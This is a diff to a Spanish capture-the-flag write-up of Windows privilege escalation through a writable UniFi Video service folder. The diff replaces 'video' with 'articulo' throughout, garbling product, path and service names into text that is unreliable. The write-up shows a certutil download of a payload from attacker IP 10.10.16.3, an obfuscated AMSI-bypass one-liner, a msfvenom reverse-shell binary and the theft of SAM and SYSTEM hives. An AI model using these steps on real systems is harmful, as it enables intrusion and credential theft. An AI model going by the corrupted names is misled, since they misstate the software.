@@ -247,19 +247,19 @@ Puedo visualizar la primera flag
 En su directorio personal de documentos, hay un archivo con contenido
 
 ```null
-*Evil-WinRM* PS C:\Users\Stacy\Documents> type unifivideo
+*Evil-WinRM* PS C:\Users\Stacy\Documents> type unifiarticulo
 stop
 ```
 
 Busco exploits asociados a ese nombre
 
 ```null
-searchsploit unifi video
+searchsploit unifi articulo
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                                 |  Path
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Ubiquiti Networks UniFi Video Default - 'crossdomain.xml' Security Bypass                                                                                                      | php/webapps/39268.java
-Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation                                                                                                                        | windows/local/43390.txt
+Ubiquiti Networks UniFi articulo Default - 'crossdomain.xml' Security Bypass                                                                                                      | php/webapps/39268.java
+Ubiquiti UniFi articulo 3.7.3 - Local Privilege Escalation                                                                                                                        | windows/local/43390.txt
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
@@ -269,29 +269,29 @@ Examino el exploit para ver en que consiste
 ```null
 5. VULNERABILITY DETAILS
 ========================
-Ubiquiti UniFi Video for Windows is installed to "C:\ProgramData\unifi-video\"
-by default and is also shipped with a service called "Ubiquiti UniFi Video". Its
+Ubiquiti UniFi articulo for Windows is installed to "C:\ProgramData\unifi-articulo\"
+by default and is also shipped with a service called "Ubiquiti UniFi articulo". Its
 executable "avService.exe" is placed in the same directory and also runs under
 the NT AUTHORITY/SYSTEM account.
 
-However the default permissions on the "C:\ProgramData\unifi-video" folder are
+However the default permissions on the "C:\ProgramData\unifi-articulo" folder are
 inherited from "C:\ProgramData" and are not explicitly overridden, which allows
 all users, even unprivileged ones, to append and write files to the application
 directory
 
-c:\ProgramData>icacls unifi-video
-unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+c:\ProgramData>icacls unifi-articulo
+unifi-articulo NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
 BUILTIN\Administrators:(I)(OI)(CI)(F)
 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
 BUILTIN\Users:(I)(OI)(CI)(RX)
 BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)
 
 Upon start and stop of the service, it tries to load and execute the file at
-"C:\ProgramData\unifi-video\taskkill.exe". However this file does not exist in
+"C:\ProgramData\unifi-articulo\taskkill.exe". However this file does not exist in
 the application directory by default at all.
 ```
 
-Tengo capacidad de escritura en la ruta donde está instalado unifi-video. Al reiniciar el servicio se busca por un binario que no existe. El vector de escalada consiste en crear mi propio binario que se encargue enviarme una reverse shell a mi equipo
+Tengo capacidad de escritura en la ruta donde está instalado unifi-articulo. Al reiniciar el servicio se busca por un binario que no existe. El vector de escalada consiste en crear mi propio binario que se encargue enviarme una reverse shell a mi equipo
 
 Con msfvenom creo el payload
 
@@ -307,13 +307,13 @@ Saved as: taskkill.exe
 Creo un servicio http con python y lo descargo en la máquina víctima. Al ejecutarlo para comprobar que está funcional, lo bloquea el AMSI
 
 ```null
-*Evil-WinRM* PS C:\ProgramData\unifi-video> certutil.exe -f -split -urlcache http://10.10.16.3/taskkill.exe taskkill.exe
+*Evil-WinRM* PS C:\ProgramData\unifi-articulo> certutil.exe -f -split -urlcache http://10.10.16.3/taskkill.exe taskkill.exe
 ****  Online  ****
   000000  ...
   01204a
 CertUtil: -URLCache command completed successfully.
 
-*Evil-WinRM* PS C:\ProgramData\unifi-video> .\taskkill.exe
+*Evil-WinRM* PS C:\ProgramData\unifi-articulo> .\taskkill.exe
 Program 'taskkill.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
 + .\taskkill.exe
 + ~~~~~~~~~~~~~~.
@@ -351,13 +351,13 @@ PS C:\Temp>
 Intento corromper la tarea, pero no consigo nada
 
 ```null
-PS C:\ProgramData\unifi-video> $a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
-PS C:\ProgramData\unifi-video> .\taskkill.exe
+PS C:\ProgramData\unifi-articulo> $a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
+PS C:\ProgramData\unifi-articulo> .\taskkill.exe
 ERROR: Program 'taskkill.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
 + .\taskkill.exe
 + ~~~~~~~~~~~~~~.
 
-PS C:\ProgramData\unifi-video> 
+PS C:\ProgramData\unifi-articulo> 
 ```
 
 Pruebo a compilar un script en C desarrollado por mí, utilizando mingw-w64
@@ -383,7 +383,7 @@ x86_64-w64-mingw32-gcc script.c -o taskkill.exe
 Intento listar los servicios, pero no tengo acceso
 
 ```null
-*Evil-WinRM* PS C:\ProgramData\unifi-video> sc.exe query
+*Evil-WinRM* PS C:\ProgramData\unifi-articulo> sc.exe query
 [SC] OpenSCManager FAILED 5:
 
 Access is denied.
@@ -392,17 +392,17 @@ Access is denied.
 Una manera alternativa es listando los registros
 
 ```null
-*Evil-WinRM* PS C:\ProgramData\unifi-video> reg query HKLM\SYSTEM\CurrentControlSet\Services | Select-String unifi
+*Evil-WinRM* PS C:\ProgramData\unifi-articulo> reg query HKLM\SYSTEM\CurrentControlSet\Services | Select-String unifi
 
-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UniFiVideoService
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UniFiarticuloservice
 ```
 
 Reinicio el servicio y recibo en mi equipo la SAM y el SYSTEM
 
 ```null
-*Evil-WinRM* PS C:\ProgramData\unifi-video> cmd /c sc stop UniFiVideoService
+*Evil-WinRM* PS C:\ProgramData\unifi-articulo> cmd /c sc stop UniFiarticuloservice
 
-SERVICE_NAME: UniFiVideoService
+SERVICE_NAME: UniFiarticuloservice
         TYPE               : 10  WIN32_OWN_PROCESS
         STATE              : 3  STOP_PENDING
                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
